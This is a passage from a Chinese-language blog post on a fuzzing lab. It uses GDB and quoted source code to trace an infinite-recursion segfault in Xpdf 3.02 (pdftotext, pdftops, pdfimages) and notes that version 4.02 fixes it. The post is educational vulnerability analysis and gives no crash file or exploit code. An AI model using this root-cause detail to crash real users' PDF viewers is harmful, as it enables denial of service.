<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftops test.pdf        </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3141 segmentation fault  ./pdftops test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfimages test.pdf test     </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3236 segmentation fault  ./pdfimages test.pdf test <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>其中 <code>pdftotext</code> <code>pdftops</code> <code>pdfimages</code> 出现了段错误</li>
<li>我们先用 GDB 调试 <code>pdftotext</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./pdftotext ./test.pdf</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 GDB <code>bt</code> 命令来获取栈回溯：</li>
</ul>
<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660445660783.png" class width="1660445660783"> 
<ul>
<li>发现程序的行为异常，不断调用 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code>，程序无限递归最终崩溃（经过测试，<code>pdftops</code> <code>pdfimages</code> 中的段错误也是这个原因）</li>
</ul>
<p>我们在 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code> 处打上断点，配合源码用 GDB 单步调试：</p>
<ul>
<li>触发断点的顺序如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parser::getObj(若干次) -&gt; Parser::makeStream -&gt; Object::dictLookup -&gt; XRef::fetch</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Parser::makeStream -&gt; Object::dictLookup</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dict-&gt;dictLookup(<span class="string">&quot;Length&quot;</span>, &amp;obj); <span class="comment">/* 正常调用dictLookup */</span></span><br><span class="line"><span class="keyword">if</span> (obj.isInt()) &#123;</span><br><span class="line">  length = (Guint)obj.getInt();</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  error(getPos(), <span class="string">&quot;Bad &#x27;Length&#x27; attribute in stream&quot;</span>);</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Object::dictLookup -&gt; XRef::fetch</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> Object *<span class="title">Object::dictLookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">return</span> dict-&gt;lookup(key, obj); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object *<span class="title">Dict::lookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span> </span>&#123;</span><br><span class="line">  DictEntry *e;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (e = find(key)) ? e-&gt;val.fetch(xref, obj) : obj-&gt;initNull(); <span class="comment">/* 正常调用fetch */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>XRef::fetch -&gt; Parser::getObj</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   parser-&gt;getObj(&amp;obj1); <span class="comment">/* 会调用4次getObj */</span></span><br><span class="line">   parser-&gt;getObj(&amp;obj2);</span><br><span class="line">   parser-&gt;getObj(&amp;obj3);</span><br><span class="line">   <span class="keyword">if</span> (!obj1.isInt() || obj1.getInt() != num ||</span><br><span class="line">!obj2.isInt() || obj2.getInt() != gen ||</span><br><span class="line">!obj3.isCmd(<span class="string">&quot;obj&quot;</span>)) &#123;</span><br><span class="line">     obj1.<span class="built_in">free</span>();</span><br><span class="line">     obj2.<span class="built_in">free</span>();</span><br><span class="line">     obj3.<span class="built_in">free</span>();</span><br><span class="line">     <span class="keyword">delete</span> parser;</span><br><span class="line">     <span class="keyword">goto</span> err;</span><br><span class="line">   &#125;</span><br><span class="line">   parser-&gt;getObj(obj, encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">	   encAlgorithm, keyLength, num, gen);</span><br><span class="line">   obj1.<span class="built_in">free</span>();</span><br><span class="line">   obj2.<span class="built_in">free</span>();</span><br><span class="line">   obj3.<span class="built_in">free</span>();</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Parser::getObj -&gt; Parser::getObj</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">while</span> (!buf1.isCmd(<span class="string">&quot;&gt;&gt;&quot;</span>) &amp;&amp; !buf1.isEOF()) &#123;</span><br><span class="line">     <span class="keyword">if</span> (!buf1.isName()) &#123;</span><br><span class="line">error(getPos(), <span class="string">&quot;Dictionary key must be a name object&quot;</span>);</span><br><span class="line">shift();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) &#123;</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line">			 objNum, objGen)); <span class="comment">/* 多次调用dictAdd,在其中调用getObj */</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 <code>Parser::getObj -&gt; Parser::makeStream</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (allowStreams &amp;&amp; buf2.isCmd(<span class="string">&quot;stream&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">   objNum, objGen))) <span class="comment">/* 正常调用makeStream */</span></span><br></pre></td></tr></table></figure>
<p>从整个调用链来看，程序的运行逻辑就是闭合的，可能作者需要这种递归调用来完成一些工作，盲猜作者在涉及调用条件时出现了一些问题：</p>
<ul>
<li><code>Parser::makeStream -&gt; Object::dictLookup</code> 和 <code>Object::dictLookup -&gt; XRef::fetch</code> 都是无条件调用，这里应该不会出现问题</li>
<li><code>XRef::fetch</code> 中调用了4次 <code>getObj</code>，<code>Parser::getObj</code> 中通过多次调用 <code>dictAdd</code> 来调用 <code>getObj</code>，但它们的调用都是有条件的，如果某一次的传入的 <code>Object</code> 结构体设置不对，就可能导致无限调用</li>
</ul>
<p>下载 4.02 版本代码，对比 <code>Parser.cc</code>，可以看到此漏洞被修复：</p>
<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/2308014-20210907124158811-1900620626.png" class title="2308014-20210907124158811-1900620626"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/19/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><span class="page-number current">20</span><a class="page-number" href="/page/21/">21</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/21/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">329</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:32</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
